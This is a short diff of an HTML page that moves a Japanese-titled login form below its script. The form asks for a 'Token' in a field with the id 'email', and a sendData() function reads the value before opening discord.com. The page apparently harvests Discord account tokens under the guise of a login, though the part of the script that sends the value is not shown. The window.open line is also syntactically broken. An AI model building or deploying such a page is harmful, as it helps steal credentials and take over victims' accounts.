@@ -72,16 +72,6 @@
 </style>
 </head>
 <body>
-
-<form id="loginForm">
-    <div class="form-title"><h2>ログイン</h2></div>
-    <label for="email">Token</label>
-    <input type="text" id="email" name="email" required>
-    <input type="button" value="ログイン" onclick="sendData()">
-    <div class="form-footer">
-    </div>
-</form>
-
 <script>
 function sendData() {
     var email = document.getElementById('email').value;
@@ -102,6 +92,14 @@ function sendData() {
   window.open("https://discord.com," '_blank')
 }
 </script>
+<form id="loginForm">
+    <div class="form-title"><h2>ログイン</h2></div>
+    <label for="email">Token</label>
+    <input type="text" id="email" name="email" required>
+    <input type="button" value="ログイン" onclick="sendData()">
+    <div class="form-footer">
+    </div>
+</form>
 
 </body>
 </html>
